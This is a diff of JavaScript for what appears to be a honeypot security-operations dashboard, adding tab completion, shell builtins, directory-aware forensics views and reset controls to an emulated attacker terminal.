+        const completed = match.insert + (needsSpace ? " " : "");
+        input.value = val.slice(0, tokenStart) + completed + after;
+        const newPos = tokenStart + completed.length;
+        input.setSelectionRange(newPos, newPos);
+        return;
+      }
+
+      const lcp = longestCommonPrefix(candidates.map(c => c.insert));
+      if (lcp.length > rawToken.length) {
+        input.value = val.slice(0, tokenStart) + lcp + after;
+        const newPos = tokenStart + lcp.length;
+        input.setSelectionRange(newPos, newPos);
+        return;
+      }
+
+      if (!termHistory[currentActor]) termHistory[currentActor] = "";
+      termHistory[currentActor] +=
+        "root@payroll-admin-prod-01:" + getPromptCwd(currentActor) + "# " + val + "\n" +
+        candidates.map(c => c.display).join("  ") + "\n";
+      renderTerm();
+    }
+
     function handleTermKeydown(e) {
       const input = e.target;
       if (!input) return;
+
+      if (e.key === "Tab") {
+        e.preventDefault();
+        handleTabComplete(input);
+        return;
+      }
 
       if (e.ctrlKey && (e.key === "l" || e.key === "L")) {
         e.preventDefault();
@@ -1758,7 +2399,7 @@
         if (!sel && input.selectionStart === input.selectionEnd) {
           e.preventDefault();
           if (!termHistory[currentActor]) termHistory[currentActor] = "";
-          termHistory[currentActor] += "root@payroll-admin-prod-01:/tmp/honeypot# " + input.value + "^C\n";
+          termHistory[currentActor] += "root@payroll-admin-prod-01:" + getPromptCwd(currentActor) + "# " + input.value + "^C\n";
           input.value = "";
           if (cmdHistory[currentActor]) {
             cmdHistoryIdx[currentActor] = cmdHistory[currentActor].length;
@@ -1776,7 +2417,7 @@
         input.value = "";
         if (!cmd) {
           if (!termHistory[currentActor]) termHistory[currentActor] = "";
-          termHistory[currentActor] += "root@payroll-admin-prod-01:/tmp/honeypot# \n";
+          termHistory[currentActor] += "root@payroll-admin-prod-01:" + getPromptCwd(currentActor) + "# \n";
           renderTerm();
           return;
         }
@@ -1825,10 +2466,12 @@
         const stillExists = deltas.some(d => d.name === selectedFile);
         if (stillExists) return selectedFile;
       }
-      const rootkit = deltas.find(d => d.name === "rootkit.sh" && d.status !== "UNCHANGED");
+      const rootkit = deltas.find(d => (d.name === "rootkit.sh" || d.name.endsWith("/rootkit.sh")) && d.status !== "UNCHANGED");
       if (rootkit) return rootkit.name;
-      const changed = deltas.find(d => d.status === "ADDED" || d.status === "MODIFIED" || d.status === "DELETED");
-      if (changed) return changed.name;
+      const changedFile = deltas.find(d => !d.name.endsWith("/") && (d.status === "ADDED" || d.status === "MODIFIED" || d.status === "DELETED"));
+      if (changedFile) return changedFile.name;
+      const changedAny = deltas.find(d => d.status === "ADDED" || d.status === "MODIFIED" || d.status === "DELETED");
+      if (changedAny) return changedAny.name;
       return deltas[0].name;
     }
 
@@ -1854,17 +2497,30 @@
         return;
       }
 
+      const isDir = entry.name.endsWith("/") || (entry.mode || "").startsWith("d");
       titleEl.textContent = "/tmp/honeypot/" + entry.name;
-      metaEl.textContent = entry.status + " • sha256:" + (entry.sha256 || "n/a");
+      titleEl.title = "/tmp/honeypot/" + entry.name;
+      metaEl.textContent = entry.status + " • " + (isDir ? "dir" : (entry.sha256 || "n/a").slice(0, 8));
+      metaEl.title = entry.status + " • " + (isDir ? "directory" : ("sha256:" + (entry.sha256 || "n/a")));
 
       if (entry.status === "DELETED") {
         bodyEl.className = "inspector-body deleted-notice";
         bodyEl.textContent =
           "[ANTI-FORENSIC WIPE DETECTED]\n" +
-          "File \"" + entry.name + "\" was deleted from the live /tmp/honeypot overlay (rm -rf).\n" +
-          "Last known SHA-256: " + (entry.sha256 || "unknown") + " (" + (entry.size_bytes || 0) + " bytes)\n" +
-          "Last preview: " + (entry.content_preview || "(empty)") + "\n\n" +
-          "-> Click [Revert Pre-Wipe Snapshot] or a vN checkpoint node above to restore the wiped file and Go heap state.";
+          (isDir ? "Directory \"" : "File \"") + entry.name + "\" was deleted from the live /tmp/honeypot overlay (rm -rf).\n" +
+          (isDir ? "" : ("Last known SHA-256: " + (entry.sha256 || "unknown") + " (" + (entry.size_bytes || 0) + " bytes)\n")) +
+          (isDir ? "\n" : ("Last preview: " + (entry.content_preview || "(empty)") + "\n\n")) +
+          "-> Click [Revert Pre-Wipe Snapshot] or a vN checkpoint node above to restore the wiped path and Go heap state.";
+      } else if (isDir) {
+        bodyEl.className = "inspector-body";
+        const children = deltas.filter(x => x.name !== entry.name && x.name.startsWith(entry.name) && x.status !== "DELETED");
+        if (children.length === 0) {
+          bodyEl.textContent = "[Directory created at /tmp/honeypot/" + entry.name + "]\n(Currently empty)";
+        } else {
+          bodyEl.textContent =
+            "[Directory /tmp/honeypot/" + entry.name + "]\n" +
+            children.map(c => "  " + c.status + "  " + c.name + (c.name.endsWith("/") ? "" : (" (" + (c.size_bytes || 0) + " B)"))).join("\n");
+        }
       } else {
         bodyEl.className = "inspector-body";
         const raw = filesMap[entry.name];
@@ -1913,6 +2569,19 @@
       container.replaceChildren(...nodes);
     }
 
+    function updateDirectorAuditPill(f) {
+      const countEl = document.getElementById("directorAuditCount");
+      if (!countEl) return;
+      const count = (f && Array.isArray(f.forensic_audit_trail)) ? f.forensic_audit_trail.length : 0;
+      if (count > 0) {
+        countEl.textContent = String(count);
+        countEl.hidden = false;
+      } else {
+        countEl.textContent = "0";
+        countEl.hidden = true;
+      }
+    }
+
     function renderState(data) {
       if (!data) return;
       lastStateData = data;
@@ -1924,6 +2593,11 @@
       }
 
       const actors = data.actors || [];
+      actors.forEach(a => {
+        if (a && a.actor_name && a.last_forensics) {
+          syncActorKnownEntries(a.actor_name, a.last_forensics);
+        }
+      });
       const currentTracker = actors.find(a => a.actor_name === currentActor) || null;
 
       // Render Actor Session Tabs safely
@@ -1977,6 +2651,16 @@
       }
 
       const f = data.forensics;
+      if (f) {
+        syncActorKnownEntries(currentActor, f);
+      }
+      if (f && f.current_working_dir) {
+        actorCwd[currentActor] = f.current_working_dir;
+      } else if (data.shell && data.shell.cwd) {
+        actorCwd[currentActor] = normalizeDisplayCwd(data.shell.cwd);
+      }
+      syncPromptUI();
+      updateDirectorAuditPill(f);
       if (!f) {
         renderSnapshotTimeline(data, currentTracker, false);
         return;
@@ -2054,16 +2738,22 @@
         tdStatus.appendChild(badge);
 
         const tdName = document.createElement("td");
+        tdName.title = d.name;
         const nameStrong = document.createElement("strong");
         nameStrong.textContent = d.name;
         tdName.appendChild(nameStrong);
 
+        const isDirRow = d.name.endsWith("/") || (d.mode || "").startsWith("d");
         const tdMode = document.createElement("td");
-        tdMode.textContent = (d.mode || "-rw-r--r--") + " (" + (d.size_bytes || 0) + "B)";
+        tdMode.title = isDirRow
+          ? ((d.mode || "drwxr-xr-x") + " (directory)")
+          : ((d.mode || "-rw-r--r--") + " (" + (d.size_bytes || 0) + " bytes)");
+        tdMode.textContent = isDirRow ? "dir" : ((d.size_bytes || 0) + " B");
 
         const tdSha = document.createElement("td");
         const shaCode = document.createElement("code");
-        shaCode.textContent = d.sha256 || "";
+        shaCode.title = isDirRow ? "directory" : (d.sha256 || "");
+        shaCode.textContent = isDirRow ? "\u2014" : (d.sha256 || "").slice(0, 8);
         tdSha.appendChild(shaCode);
 
         tr.appendChild(tdStatus);
@@ -2125,8 +2815,11 @@
       if (input) {
         input.value = cmdDraft[actorName] || "";
       }
+      syncPromptUI();
       renderTerm();
-      const res = await fetch("/api/state?actor=" + encodeURIComponent(actorName));
+      const wakeParam = directorOpen ? "&wake=1" : "";
+      const res = await fetch("/api/state?actor=" + encodeURIComponent(actorName) + wakeParam);
+      if (!res.ok) return;
       const data = await res.json();
       renderState(data);
     }
@@ -2134,33 +2827,86 @@
     function submitCustomActor(e) {
       e.preventDefault();
       const input = document.getElementById("customActorInput");
-      const raw = (input.value || "").trim();
+      const raw = (input.value || "").trim().toLowerCase();
       if (!raw) return;
       input.value = "";
-      const actorName = raw.startsWith("honeypot-")
-        ? raw
-        : "honeypot-" + raw.replace(/[^a-zA-Z0-9]+/g, "-").replace(/^-|-$/g, "");
+      const sanitized = raw.replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "");
+      if (!sanitized) return;
+      const actorName = sanitized.startsWith("honeypot-")
+        ? sanitized
+        : "honeypot-" + sanitized;
       selectActor(actorName);
     }
 
     async function execCmd(cmd) {
       userPinnedFile = false;
+      const cwdBefore = getPromptCwd(currentActor);
+      const trimmed = (cmd || "").trim();
+      const input = document.getElementById("customCmdInput");
+
+      if (trimmed === "clear" || trimmed === "cls" || trimmed === "reset") {
+        recordCmdHistory(currentActor, trimmed);
+        resetExitBadge();
+        clearTerm();
+        return;
+      }
+
+      if (trimmed === "history -c") {
+        cmdHistory[currentActor] = [];
+        cmdHistoryIdx[currentActor] = 0;
+        cmdDraft[currentActor] = "";
+        appendTerm(currentActor, trimmed, { stdout: "", exit_code: 0 }, cwdBefore);
+        if (input) input.focus();
+        return;
+      }
+
+      if (trimmed === "history") {
+        recordCmdHistory(currentActor, trimmed);
+        const list = cmdHistory[currentActor] || [];
+        const histOut = list
+          .map((entry, idx) => String(idx + 1).padStart(5, " ") + "  " + entry)
+          .join("\n") + (list.length > 0 ? "\n" : "");
+        appendTerm(currentActor, trimmed, { stdout: histOut, exit_code: 0 }, cwdBefore);
+        if (input) input.focus();
+        return;
+      }
+
+      if (trimmed === "help") {
+        recordCmdHistory(currentActor, trimmed);
+        const helpOut =
+          "POSIX /bin/sh console (Tab completes commands & paths, Up/Down recalls history)\n" +
+          "  Builtins : cd, pwd, export, echo, printf, clear (Ctrl+L), history, history -c, help\n" +
+          "  Commands : ls, cat, mkdir, rmdir, rm, cp, mv, chmod, touch, grep, find, head, tail, id, uname, env, ps\n";
+        appendTerm(currentActor, trimmed, { stdout: helpOut, exit_code: 0 }, cwdBefore);
+        if (input) input.focus();
+        return;
+      }
+
+      let remoteCmd = cmd;
+      const clearChain = trimmed.match(/^(?:clear|cls)(?:\s*&&\s*|\s*;\s*)(.+)$/);
+      if (clearChain && clearChain[1]) {
+        termHistory[currentActor] = "";
+        renderTerm();
+        remoteCmd = clearChain[1];
+      }
+
       recordCmdHistory(currentActor, cmd);
       const res = await fetch("/api/attacker/exec", {
         method: "POST",
         headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({actor_name: currentActor, cmd})
+        body: JSON.stringify({actor_name: currentActor, cmd: remoteCmd})
       });
+      if (!res.ok) return;
       const data = await res.json();
-      appendTerm(currentActor, cmd, data.shell);
+      appendTerm(currentActor, remoteCmd === cmd ? cmd : remoteCmd, data.shell, cwdBefore);
       renderState(data);
-      const input = document.getElementById("customCmdInput");
       if (input) input.focus();
     }
 
     function runPlaybook(step) {
       const cmd = PLAYBOOK_CMDS[step];
-      if (cmd) execCmd(cmd);
+      if (cmd) return execCmd(cmd);
+      return Promise.resolve();
     }
 
     async function socSave() {
@@ -2169,6 +2915,7 @@
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({actor_name: currentActor, reason: "Manual SOC Checkpoint"})
       });
+      if (!res.ok) return;
       const data = await res.json();
       renderState(data);
     }
@@ -2179,6 +2926,7 @@
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({actor_name: currentActor})
       });
+      if (!res.ok) return;
       const data = await res.json();
       renderState(data);
     }
@@ -2190,6 +2938,7 @@
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({actor_name: currentActor, target_version: targetVersion || 0})
       });
+      if (!res.ok) return;
       const data = await res.json();
       appendTerm(currentActor, "# [SOC DIRECTOR REVERTED SANDBOX TO PRE-WIPE SNAPSHOT]", {
         stdout: "Restored /tmp/honeypot overlay & Go heap RAM from checkpoint v" + (data.snapshot_version || 1) + ".\n",
@@ -2205,6 +2954,7 @@
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({source_actor: currentActor, new_actor: "honeypot-forensic-lab"})
       });
+      if (!res.ok) return;
       const data = await res.json();
       currentActor = data.actor_name;
       termHistory[currentActor] = "# [FORENSIC LAB CLONE CREATED FROM LIVE ATTACKER SNAPSHOT]\n";
@@ -2212,7 +2962,82 @@
       renderState(data);
     }
 
-    selectActor(currentActor);
+    function setResetButtonsBusy(busy, stageLabel) {
+      const stageBtn = document.getElementById("resetStageBtn");
+      const actorBtn = document.getElementById("resetActorBtn");
+      const stageLbl = document.getElementById("resetStageLabel");
+      const actorLbl = document.getElementById("resetActorLabel");
+      if (stageBtn) stageBtn.disabled = busy;
+      if (actorBtn) actorBtn.disabled = busy;
+      if (stageLbl) stageLbl.textContent = busy && stageLabel ? stageLabel : "Reset Stage";
+      if (actorLbl) actorLbl.textContent = busy && !stageLabel ? "Resetting..." : "Reset Actor";
+    }
+
+    async function socResetActor() {
+      setResetButtonsBusy(true, "");
+      try {
+        const res = await fetch("/api/soc/reset", {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({actor_name: currentActor, scope: "actor"})
+        });
+        if (!res.ok) return;
+        const data = await res.json();
+        termHistory[currentActor] = "";
+        cmdHistory[currentActor] = [];
+        cmdHistoryIdx[currentActor] = 0;
+        cmdDraft[currentActor] = "";
+        actorCwd[currentActor] = "/tmp/honeypot";
+        delete actorKnownEntries[currentActor];
+        selectedFile = "";
+        userPinnedFile = false;
+        resetExitBadge();
+        syncPromptUI();
+        renderTerm();
+        renderState(data);
+        const input = document.getElementById("customCmdInput");
+        if (input) input.focus();
+      } finally {
+        setResetButtonsBusy(false, "");
+      }
+    }
+
+    async function socResetStage() {
+      setResetButtonsBusy(true, "Resetting...");
+      try {
+        const res = await fetch("/api/soc/reset", {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({scope: "stage"})
+        });
+        if (!res.ok) return;
+        const data = await res.json();
+        Object.keys(termHistory).forEach(k => delete termHistory[k]);
+        Object.keys(cmdHistory).forEach(k => delete cmdHistory[k]);
+        Object.keys(cmdHistoryIdx).forEach(k => delete cmdHistoryIdx[k]);
+        Object.keys(cmdDraft).forEach(k => delete cmdDraft[k]);
+        Object.keys(actorCwd).forEach(k => delete actorCwd[k]);
+        Object.keys(actorKnownEntries).forEach(k => delete actorKnownEntries[k]);
+        currentActor = data.actor_name || "honeypot-203-0-113-5";
+        selectedFile = "";
+        userPinnedFile = false;
+        resetExitBadge();
+        syncPromptUI();
+        const input = document.getElementById("customCmdInput");
+        if (input) input.value = "";
+        await setDirectorOpen(false);
+        renderState(data);
+        renderTerm();
+        if (input) input.focus();
+      } finally {
+        setResetButtonsBusy(false, "");
+      }
+    }
+
+    selectActor(currentActor).then(() => {
+      const input = document.getElementById("customCmdInput");
+      if (input) input.focus();
+    });
   </script>
   <script src="/api/auth/presenter.js" defer></script>
 </body>
